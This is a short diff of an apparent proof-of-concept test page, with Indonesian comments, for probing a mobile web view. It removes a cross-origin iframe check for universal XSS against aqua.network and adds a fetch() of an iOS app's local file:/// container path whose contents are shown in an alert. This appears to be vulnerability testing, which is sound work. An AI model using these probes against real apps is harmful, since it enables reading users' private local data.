@@ -1,11 +1,5 @@
-<iframe id="f" src="https://aqua.network"></iframe>
 <script>
-f.onload = () => {
-  try{
-    alert("Coba akses: " + f.contentWindow.document.domain);
-    // Kalau muncul "aqua.network" bukan error cross-origin = UXSS = CRITICAL
-  }catch(e){
-    alert("Blocked (aman): " + e);
-  }
-}
+fetch("file:///var/mobile/Containers/Data/Application/")
+.then(r=>r.text()).then(t=>alert(t.slice(0,100)))
+.catch(e=>alert("AMAN: "+e))
 </script>
